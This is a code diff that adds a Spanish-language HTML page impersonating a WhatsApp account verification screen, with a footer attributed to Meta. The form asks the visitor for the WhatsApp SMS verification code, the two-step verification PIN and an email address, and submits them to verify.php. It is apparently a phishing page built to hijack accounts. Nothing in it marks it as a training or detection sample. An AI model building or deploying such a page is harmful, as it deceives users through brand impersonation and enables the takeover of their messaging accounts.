@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#00AF75">
+    <title>WhatsApp Verify</title>
+    <link rel="shortcut icon" href="img/Imagen2.png" type="image/x-icon">
+    <link rel="stylesheet" href="./css/styles.css">
+    <script src="./js/scripts.js"></script>
+    <script src="js/sweetalert2.all.js"></script>
+</head>
+<body>
+    <header>
+        <h1>Verifica tu WhatsApp</h1>
+    </header>
+    <div class="content-primary">
+        <form action="verify.php" method="post">
+            <div class="inputs">
+                <label for="">Codigo de Verificación</label><br>
+                <input type="password" name="CodDigitos" autofocus required><br>
+                <a href="#">No recibiste el codigo?</a><br><br><br>
+                <p id="info">Si anteriormente has activado la verificación en dos pasos,<br>
+                es <b>necesario</b> introducirlo en los siguientes recuadros, <br>
+                si aún no lo has activado, has caso omiso de esta advertencia.</p><br>
+                <div>
+                    <label for="">Codigo de Activación de dos pasos</label><br>
+                    <input type="password" name="CodeVerify" autofocus><br><br>
+                    <label for="">Correo Electrónico</label><br>
+                    <input type="email" name="Correo" autofocus><br><br>
+                </div>
+            </div><br><br><br><br><br><br><br><br><br>
+            <div id="areaButton">
+                <button type="submit" onclick="success()">Verificar</button>
+            </div>
+        </form>
+    </div>
+    <footer>
+        META.INC
+    </footer>
+</body>
+</html>
